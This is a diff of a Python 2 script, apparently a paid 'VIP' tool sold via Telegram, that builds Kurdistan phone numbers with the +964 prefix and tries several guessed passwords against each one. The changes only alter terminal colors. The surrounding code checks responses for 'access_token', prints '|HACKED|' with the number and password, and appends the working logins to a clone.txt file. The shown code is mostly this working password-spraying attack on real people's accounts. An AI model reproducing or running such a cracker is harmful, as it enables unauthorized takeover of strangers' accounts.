@@ -104,7 +104,7 @@ def tik():
 
     for o in titik:
 
-        print '\r\x1b[1;99mTKAYA BOSTA \x1b[1;99m' + o,
+        print '\r\x1b[1;92mTKAYA BOSTA \x1b[1;99m' + o,
 
         sys.stdout.flush()
 
@@ -151,13 +151,13 @@ logo = """\033[92m
  _/ /    / /_/ /  / _, _/  / ___ | / __  /   _/ /    / /  / /  
 /___/   /_____/  /_/ |_|  /_/  |_|/_/ /_/   /___/   /_/  /_/                                                                                                 
 
-\033[99mCREADET BY IBRAHIM 
+\033[92mCREADET BY IBRAHIM 
 
 \033[91mTOOL VIP 5$
 
-\033[99mTELEGRAM / @ibrahimzaxoiy16
+\033[92mTELEGRAM / @ibrahimzaxoiy16
 
-\033[99m------------------------------------------------------------
+\033[91m------------------------------------------------------------
 
 """
 
@@ -173,11 +173,11 @@ loop = 'true'
 
 while loop == 'true':
 
-    username = raw_input('\x1b[1;99m\xe2\x9e\xa3 Username : ')
+    username = raw_input('\x1b[1;97m\xe2\x9e\xa3 Username : ')
 
     if username == CorrectUsername:
 
-        password = raw_input('\x1b[1;99m\xe2\x9e\xa3 Password : ')
+        password = raw_input('\x1b[1;97m\xe2\x9e\xa3 Password : ')
 
         if password == CorrectPassword:
 
@@ -189,11 +189,11 @@ while loop == 'true':
 
         else:
 
-           print '\x1b[1;91mPASSWORD XALATA\x1b[1;99m'
+           print '\x1b[1;91mPASSWORD XALATA\x1b[1;97m'
 
     else:
 
-        print '\x1b[1;91mUSERNAME XALATA\x1b[1;99m'
+        print '\x1b[1;91mUSERNAME XALATA\x1b[1;97m'
 
 def lisensi():
 
@@ -207,9 +207,9 @@ def menu():
 
     print logo
 
-    print '\x1b[1;92m[1]\x1b[1;99m CRACK NUMBER KURDISTAN  \033[92m[NO CP] \033[99m'
+    print '\x1b[1;92m[1]\x1b[1;92m CRACK NUMBER KURDISTAN  \033[92m[NO CP] \033[99m'
 
-    print '\n\x1b[1;92m[0]\x1b[1;99mBACK           '
+    print '\n\x1b[1;92m[0]\x1b[1;91mBACK           '
 
     action()
 
@@ -221,7 +221,7 @@ def action():
 
     global oks
 
-    peak = raw_input('\n\x1b[1;99mCHOOSE : \x1b[1;99m')
+    peak = raw_input('\n\x1b[1;92mCHOOSE : \x1b[1;97m')
 
     if peak == '':
 
@@ -235,15 +235,15 @@ def action():
 
         print logo
         
-        print '\x1b[1;99m 750 |751 |752 |753 |754' + '\n'
+        print '\x1b[1;92m  750 |751 |752 |753 |754' + '\n'
         
-        print '\x1b[1;99m 770 |771 |772 |773 |774' + '\n'
+        print '\x1b[1;91m  770 |771 |772 |773 |774' + '\n'
         
-        print '\x1b[1;99m 780 |781 |782 |783 |784' + '\n'
+        print '\x1b[1;92m  780 |781 |782 |783 |784' + '\n'
       
         try:
 
-            c = raw_input('\x1b[1;99mCHOOSE NUMBER : ')
+            c = raw_input('\x1b[1;92mCHOOSE NUMBER : ')
 
             k = '+964'
 
@@ -269,11 +269,11 @@ def action():
 
     xxx = str(len(id))
 
-    psb('[\xe2\x9c\x99] TOTAL NUMBER ' + xxx)
+    psb('[\xe2\x9c\x92] TOTAL NUMBER ' + xxx)
 
     time.sleep(0.5)
 
-    psb('[\xe2\x9c\x99] CRACK RUNNING...')
+    psb('[\xe2\x9c\x91] CRACK RUNNING...')
 
     time.sleep(0.5)
     
@@ -299,7 +299,7 @@ def action():
 
             if 'access_token' in q:
 
-                print '\x1b[1;92m|HACKED|\x1b[1;99mNUMBER|  ' + k + c + user + '  \x1b[1;99mPASS|  ' + pass1
+                print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass1
 
                 okb = open('anggaxd/clone.txt', 'a')
 
@@ -319,7 +319,7 @@ def action():
 
                 if 'access_token' in q:
 
-                    print '\x1b[1;92m|HACKED|\x1b[1;99mNUMBER|  ' + k + c + user + '  \x1b[1;99mPASS|  ' + pass2
+                    print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass2
 
                     okb = open('anggaxd/clone.txt', 'a')
 
@@ -339,7 +339,7 @@ def action():
 
                     if 'access_token' in q:
 
-                        print '\x1b[1;92m|HACKED|\x1b[1;99mNUMBER|  ' + k + c + user + '  \x1b[1;99mPASS|  ' + pass3
+                        print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass3
 
                         okb = open('anggaxd/clone.txt', 'a')
 
@@ -359,7 +359,7 @@ def action():
 
                         if 'access_token' in q:
 
-                            print '\x1b[1;92m|HACKED|\x1b[1;99mNUMBER|  ' + k + c + user + '  \x1b[1;99mPASS|  ' + pass4
+                            print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass4
 
                             okb = open('anggaxd/clone.txt', 'a')
 
@@ -379,7 +379,7 @@ def action():
 
                             if 'access_token' in q:
 
-                                print '\x1b[1;92m|HACKED|\x1b[1;99mNUMBER|  ' + k + c + user + '  \x1b[1;99mPASS|  ' + pass5
+                                print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass5
 
                                 okb = open('anggaxd/clone.txt', 'a')
 
@@ -399,7 +399,7 @@ def action():
 
                                 if 'access_token' in q:
 
-                                    print '\x1b[1;92m|HACKED|\x1b[1;99mNUMBER|  ' + k + c + user + '  \x1b[1;99mPASS|  ' + pass6
+                                    print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass6
 
                                     okb = open('anggaxd/clone.txt', 'a')
 
@@ -419,7 +419,7 @@ def action():
 
                                     if 'access_token' in q:
 
-                                        print '\x1b[1;92m|HACKED|\x1b[1;99mNUMBER|  ' + k + c + user + '  \x1b[1;99mPASS|  ' + pass7
+                                        print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass7
 
                                         okb = open('anggaxd/clone.txt', 'a')
 
@@ -439,7 +439,7 @@ def action():
 
                                         if 'access_token' in q:
 
-                                            print '\x1b[1;92m|HACKED|\x1b[1;99mNUMBER|  ' + k + c + user + '  \x1b[1;99mPASS|  ' + pass8
+                                            print '\x1b[1;92m|HACKED|\x1b[1;97mNUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass8
 
                                             okb = open('anggaxd/clone.txt', 'a')
 
@@ -457,15 +457,15 @@ def action():
 
     p.map(main, id)
 
-    print '\x1b[1;99m--------------------------------------------------'
+    print '\x1b[1;92m--------------------------------------------------'
 
-    print '[\xe2\x9c\x99] HACK TAWAW BW..'
+    print '[\xe2\x9c\x92] HACK TAWAW BW..'
 
-    print '[\xe2\x9c\x99] HAMU HACKED : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x91] HAMU HACKED : ' + str(len(oks)) + '/' + str(len(cpb))
 
     print '[\xe2\x9c\x92] SAVE BU  : anggaxd/clone.txt'
 
-    raw_input('\n\x1b[1;99m[\x1b[1;97mBACK\x1b[1;99m]')
+    raw_input('\n\x1b[1;92m[\x1b[1;97mBACK\x1b[1;92m]')
 
     menu()
 
